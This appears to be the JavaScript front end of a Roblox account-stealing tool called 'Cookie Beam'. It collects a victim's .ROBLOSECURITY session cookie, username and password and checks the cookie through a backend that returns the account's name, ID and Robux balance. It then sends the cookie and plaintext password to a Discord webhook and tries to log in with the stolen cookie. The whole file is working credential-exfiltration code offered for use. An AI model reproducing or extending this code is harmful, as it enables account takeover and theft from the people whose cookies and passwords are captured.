console.log('🍪 Cookie Beam By Userspin45 - Using Backend Proxy');

// Use the backend server URL (change to your Render URL when deployed)
const BACKEND_URL = window.location.origin; // Uses the same host

async function fetchWithTimeout(url, options = {}, timeout = 10000) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(timer);
        return response;
    } catch (error) {
        clearTimeout(timer);
        throw error;
    }
}

async function validateCookie(cookie) {
    try {
        const res = await fetchWithTimeout(`${BACKEND_URL}/validate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie })
        }, 10000);
        const data = await res.json();
        if (res.ok && data.valid) {
            return { valid: true, username: data.username, robux: data.robux, id: data.id };
        } else {
            return { valid: false, error: data.error || 'Validation failed' };
        }
    } catch (e) {
        return { valid: false, error: 'Network error: ' + e.message };
    }
}

async function sendToWebhook(payload) {
    try {
        const res = await fetchWithTimeout(`${BACKEND_URL}/send-webhook`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }, 10000);
        return res.ok;
    } catch (e) {
        console.error('Webhook error:', e);
        return false;
    }
}

function autoLogin(cookie) {
    try {
        document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com; secure; SameSite=None`;
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/home';
        }, 500);
    } catch (e) {
        console.error('❌ Error setting cookie:', e);
        document.getElementById('result').textContent = '❌ Failed to set cookie. Try manual login.';
        document.getElementById('result').className = 'status-error';
    }
}

document.getElementById('logBtn').addEventListener('click', async function() {
    const cookie = document.getElementById('cookieInput').value.trim();
    const username = document.getElementById('userInput').value.trim() || 'Not provided';
    const password = document.getElementById('passInput').value.trim() || 'Not provided';
    const resultDiv = document.getElementById('result');

    if (!cookie) {
        resultDiv.textContent = '⚠️ Please paste a .ROBLOSECURITY cookie.';
        resultDiv.className = 'status-error';
        return;
    }

    const btn = this;
    btn.disabled = true;
    btn.textContent = '⏳ Processing...';

    try {
        resultDiv.textContent = '🔍 Validating cookie via backend...';
        resultDiv.className = 'status-wait';

        const validation = await validateCookie(cookie);

        if (!validation.valid) {
            resultDiv.textContent = `❌ ${validation.error}`;
            resultDiv.className = 'status-error';
            btn.disabled = false;
            btn.textContent = '📤 Log It';
            return;
        }

        resultDiv.textContent = `✅ Valid cookie! User: ${validation.username} (${validation.id}) | Robux: ${validation.robux}`;
        resultDiv.className = 'status-ok';

        const payload = {
            content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}`
        };

        resultDiv.textContent = '📤 Sending to Discord via backend...';
        resultDiv.className = 'status-wait';

        const sent = await sendToWebhook(payload);

        if (sent) {
            resultDiv.textContent = '📤 Cookie sent! Auto-login in 3 seconds...';
            resultDiv.className = 'status-ok';
            document.getElementById('cookieInput').value = '';
            document.getElementById('userInput').value = '';
            document.getElementById('passInput').value = '';
            setTimeout(() => { autoLogin(cookie); }, 3000);
        } else {
            resultDiv.textContent = '❌ Failed to send to Discord. Check server logs.';
            resultDiv.className = 'status-error';
        }
    } catch (e) {
        console.error('❌ Error:', e);
        resultDiv.textContent = `❌ Error: ${e.message}`;
        resultDiv.className = 'status-error';
    } finally {
        btn.disabled = false;
        btn.textContent = '📤 Log It';
    }
});
